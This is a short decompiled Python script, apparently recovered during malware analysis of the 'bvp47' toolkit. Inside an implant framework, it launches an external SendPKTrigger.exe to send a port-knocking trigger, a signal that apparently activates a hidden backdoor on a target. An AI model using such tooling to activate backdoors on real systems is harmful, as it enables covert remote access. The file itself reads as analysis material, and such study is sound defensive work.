# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:19:08) [MSC v.1500 32 bit (Intel)]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: _Knock.py
import dsz, dsz.lp, dsz.version, sys

def main():
    resDir = dsz.lp.GetResourcesDirectory()
    ver = dsz.version.Info(dsz.script.Env['local_address'])
    toolLoc = resDir + 'Pc\\Tools\\%s-%s\\SendPKTrigger.exe' % (ver.compiledArch, ver.os)
    dsz.control.echo.On()
    if not dsz.cmd.Run('local run -command "%s %s" -redirect -noinput' % (toolLoc, (' ').join(sys.argv[1:]))):
        dsz.ui.Echo('* Failed to send port knocking trigger', dsz.ERROR)
    dsz.control.echo.Off()
    return True


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)
# okay decompiling D:\work\malware\bvp47\FB\Resources\Pc\PyScripts\PortKnock\_Knock.pyo
